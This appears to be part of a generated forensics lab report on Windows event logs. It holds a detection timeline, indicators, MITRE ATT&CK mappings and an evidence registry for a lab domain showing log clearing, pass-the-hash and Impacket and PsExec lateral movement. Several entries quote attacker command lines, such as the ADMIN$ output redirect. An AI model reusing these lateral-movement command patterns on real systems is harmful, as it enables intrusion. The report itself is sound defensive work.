| 2021-04-21T15:10:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:11:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:12:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:13:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:14:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:15:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:16:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:17:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:18:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:19:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-22T08:50:53 | **hayabusa** ×1 — Log Cleared — SubjectDomainName: OFFSEC ¦ SubjectLogonId: 0x7424d ¦ SubjectUserName: admmig ¦  |
| 2021-04-22T08:51:04 | **evtxecmd** ×2 — A network share object was accessed; Network share object access · **hayabusa** ×12 — Metasploit SMB Authentication; NetShare File Access — SrcUser: FS03VULN$ ¦ ShareName: \\*\ADMIN$ ¦ SharePath: \??\C:\Windows ¦ Path: S; … |
| 2021-04-22T08:51:05 | **evtxecmd** ×2 — evtxecmd [lsass,lsass.exe]: C:\Windows\System32\lsass.exe ×2 · **hayabusa** ×2 — Base64 Encoded PowerShell Command Detected — Cmdline: "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.e; Potential PowerShell Command Line Obfuscation — Cmdline: "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershel |
| 2021-04-26T08:25:31 | **hayabusa** ×1 — Log Cleared — SubjectDomainName: OFFSEC ¦ SubjectLogonId: 0x2b5f6bf ¦ SubjectUserName: admmig  |
| 2021-04-26T08:25:36 | **hayabusa** ×1 — Pass the Hash Activity 2 — Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: - ¦ SrcIP: 10.23.123.11 ¦ LID: 0x |
| 2021-04-26T08:25:37 | **hayabusa** ×8 — NetShare File Access — SrcUser: admmig ¦ ShareName: \\*\ADMIN$ ¦ SharePath: \??\C:\Windows ¦ Path: __16 ×2; Proc Exec — Cmdline: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Pro; … |
| 2021-04-26T08:25:38 | **hayabusa** ×4 — HackTool - Potential Impacket Lateral Movement Activity — Cmdline: cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__16; Suspicious Redirection to Local Admin Share — Cmdline: cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1619425227.894; … |
| 2021-04-26T08:26:03 | **evtxecmd** ×11 — evtxecmd [cscript]: C:\Windows\System32\cscript.exe ×10; evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-27T11:04:03 | **evtxecmd** ×2 — evtxecmd [termsrv]: evtxecmd/20261108132213_EvtxECmd_Output.csv:186 2,138520214,2021-04-27 11:04:03.4958683,47; evtxecmd [termsrv]: evtxecmd/20261108132213_EvtxECmd_Output.csv:189 5,138520217,2021-04-27 11:04:03.5024216,47 · **hayabusa** ×5 — Possible DC Shadow Attack — SPN: HOST/jump01.offsec.lan RestrictedKrbHost/jump01.offsec.lan HOST/JUMP01 Rest ×2; Possible DC Shadow Attack; … |
| 2021-04-27T11:04:13 | **hayabusa** ×1 — Possible DC Shadow Attack — User: admmig ¦ SID: S-1-5-21-4230534742-2542757381-3142984815-1111 ¦ ObjDN: CN=J |
| 2021-04-27T11:04:45 | **evtxecmd** ×1 — evtxecmd [termsrv]: evtxecmd/20261108132213_EvtxECmd_Output.csv:199 15,138520247,2021-04-27 11:04:45.5679404,4 |
| 2021-04-27T11:04:53 | **hayabusa** ×1 — Possible DC Shadow Attack — User: admmig ¦ SID: S-1-5-21-4230534742-2542757381-3142984815-1111 ¦ ObjDN: CN=J |
| 2021-06-10T21:21:26 | **hayabusa** ×2 — Pass the Hash Activity 2 — Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: - ¦ SrcIP: 10.23.123.11 ¦ LID: 0x; Potentially Suspicious CMD Shell Output Redirect — Cmdline: cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2 |
| 2021-12-04T21:19:16 | **evtxecmd** ×14 — evtxecmd [psexesvc,psexesvc.exe]: C:\Windows\PSEXESVC.exe ×5; evtxecmd [psexec,psexesvc]: C:\TOOLS\PsExec64.exe ×3; … · **hayabusa** ×23 — hayabusa [psexec,psexesvc,psexesvc.exe]: C:\Windows\PSEXESVC.exe ×3; hayabusa [psexesvc,psexesvc.exe]: C:\Windows\PSEXESVC.exe ×3; … |
| 2021-12-04T21:19:17 | **evtxecmd** ×1 — evtxecmd [psexec]: C:\TOOLS\PsExec64.exe · **hayabusa** ×1 — hayabusa [psexec]: C:\TOOLS\PsExec64.exe |
| 2021-12-12T07:15:28 | **hayabusa** ×1 — Log Cleared — SubjectDomainName: OFFSEC ¦ SubjectLogonId: 0x767a7ed ¦ SubjectUserName: hack1 ¦ |
| 2021-12-12T07:15:56 | **hayabusa** ×2 — Possible Hidden Service Created — Svc: RemoteRegistry ¦ User: admmig ¦ AccessMask: DELETE READ_CONTROL WRITE_D; Pass the Hash Activity 2 — Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: ¦ SrcIP: 10.23.123.11 ¦ LID: 0x87 |

_… 4 more timestamp group(s) — full set on the Timeline page._

## Indicators

### URLs / domains

- `system.io`

### IP addresses

- `10.23.123.11`

### Notable host paths

- `C:\Windows\TEMP\execute.bat`
- `C:\Windows\Temp\bouWFQYO.tmp`

### Hashes

- `04f9c3b30f0d1c0a01f105041deb497eb69ed27b34edf8b3314e4327996a1e40`

## Detections

Detection engineering follow-ups should prioritize the MITRE techniques and Sigma hits listed below. Deploy/tune rules in the lab SIEM after examiner validation of the approved findings.

- Run `detection_search` against observed techniques for concrete Sigma candidates.

## MITRE ATT&CK

| Technique | Findings |
|-----------|----------|
| `T1003.003` | F-claudebot-231 |
| `T1003.006` | F-claudebot-190, F-claudebot-231 |
| `T1021.002` | F-claudebot-138, F-claudebot-186, F-claudebot-187, F-claudebot-189, F-claudebot-191, F-claudebot-229, F-claudebot-230 |
| `T1027` | F-claudebot-139, F-claudebot-186, F-claudebot-187, F-claudebot-229 |
| `T1036` | F-claudebot-192, F-claudebot-232 |
| `T1047` | F-claudebot-189, F-claudebot-230 |
| `T1048` | F-claudebot-143, F-claudebot-189 |
| `T1059.001` | F-claudebot-139, F-claudebot-186, F-claudebot-229 |
| `T1070.001` | F-claudebot-143, F-claudebot-144, F-claudebot-188, F-claudebot-229, F-claudebot-230, F-claudebot-232 |
| `T1070.004` | F-claudebot-192, F-claudebot-230, F-claudebot-232 |
| `T1098` | F-claudebot-190, F-claudebot-192, F-claudebot-232 |
| `T1132.001` | F-claudebot-139 |
| `T1140` | F-claudebot-139, F-claudebot-186, F-claudebot-187, F-claudebot-229 |
| `T1207` | F-claudebot-190, F-claudebot-192, F-claudebot-231, F-claudebot-232 |
| `T1485` | F-claudebot-143, F-claudebot-189 |
| `T1543.003` | F-claudebot-138, F-claudebot-186, F-claudebot-187, F-claudebot-232 |
| `T1547.001` | F-claudebot-147 |
| `T1550.002` | F-claudebot-145, F-claudebot-187 |
| `T1569` | F-claudebot-191 |
| `T1569.002` | F-claudebot-138, F-claudebot-186, F-claudebot-191 |
| `T1587.001` | F-claudebot-191 |
| `T1685.001` | F-claudebot-147 |

## Insider Threat Matrix

Findings mapped to the [Insider Threat Matrix](https://insiderthreatmatrix.org/) (Motive / Means / Preparation / Infringement / Anti-Forensics). Host artifacts evidence Means and later stages; Motive is inferred only when later-stage objects are present.

### Stage coverage

| Stage | Evidenced sections | Registry sections |
|---|---|---|
| Motive | 0 | 22 |
| Means | 0 | 29 |
| Preparation | 0 | 50 |
| Infringement | 0 | 45 |
| Anti-Forensics | 0 | 37 |

_No canonical ITM section ids on findings - no stage is evidenced by this case's findings. That is absence of evidence, not absence of risk._

### Registry facts (analysis knowledge available)

- **Insider Threat Matrix**: 183 sections / 776 detections / 610 preventions (168 ATT&CK maps)
- **MITRE ATLAS** (AI/ML): 170 techniques / 35 mitigations / 57 case studies
- **MITRE MBC** (malware): 150 behaviors / 482 methods / 1160 capa-YARA rules (50 families)


## Evidence Registry

Registered items: **1**

- evtx
  - path: `C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx`
  - SHA-256: `04f9c3b30f0d1c0a01f105041deb497eb69ed27b34edf8b3314e4327996a1e40`

---

_Only APPROVED findings are included. DRAFT/REJECTED omitted by HITL design. This is a lab report — not a public attribution claim._
